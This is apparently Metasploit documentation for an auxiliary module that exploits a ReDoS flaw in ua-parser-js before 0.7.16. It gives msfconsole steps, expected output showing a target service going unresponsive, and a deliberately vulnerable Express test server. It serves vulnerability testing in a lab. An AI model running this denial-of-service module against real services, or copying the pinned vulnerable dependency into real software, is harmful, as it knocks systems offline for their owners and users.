## Vulnerable Application

This auxiliary module exploits a Regular Expression Denial of Service vulnerability
in the npm module `ua-parser-js`.  Versions before 0.7.16 are vulnerable.  
Any application that uses a vulnerable version of this module and calls the `getOS`
or `getResult` functions will be vulnerable to this module.  An example server is provided
below.

## How to Install

To install a vulnerable version of `ua-parser-js`, run:
```
npm i ua-parser-js@0.7.15
```

## Verification Steps

Example steps in this format (is also in the PR):

1. Create a new directory for test application.
2. Copy below example server into test application directory as `server.js`.
3. Run `npm i express` to install express in the test application directory.
4. To test vulnerable versions of the module, run `npm i ua-parser-js@0.7.15` to install a vulnerable version of ua-parser-js.
5. To test non-vulnerable versions of the module, run `npm i ua-parser-js` to install the latest version of ua-parser-js.
6. Once all dependencies are installed, run the server with `node server.js`.
7. Open up a new terminal.
8. Start msfconsole.
9. `use auxiliary/dos/http/ua_parser_js_redos`.
10. `set RHOST [IP]`.
11. `run`.
12. In vulnerable installations, Module should have positive output and the test application should accept no further requests.
13. In non-vulnerable installations, module should have negative output and the test application should accept further requests.

## Scenarios

### ua-parser-js npm module version 0.7.15

Expected output for successful exploitation:

```
[*] Testing Service to make sure it is working.
[*] Test request successful, attempting to send payload
[*] Sending ReDoS request to 192.168.3.24:3000.
[*] No response received from 192.168.3.24:3000, service is most likely unresponsive.
[*] Testing for service unresponsiveness.
[+] Service not responding.
[*] Auxiliary module execution completed
```

### Example Vulnerable Application

```
// npm i express
// npm i ua-parser-js@0.7.15 (vulnerable)
// npm i ua-parser-js (non-vulnerable)

const express = require('express')
const uaParser = require('ua-parser-js');
const app = express()

app.get('/', (req, res) => {
  var parser = new uaParser(req.headers['user-agent']);
  res.end(JSON.stringify(parser.getResult()));
});

app.listen(3000, '0.0.0.0', () => console.log('Example app listening on port 3000!'))
```
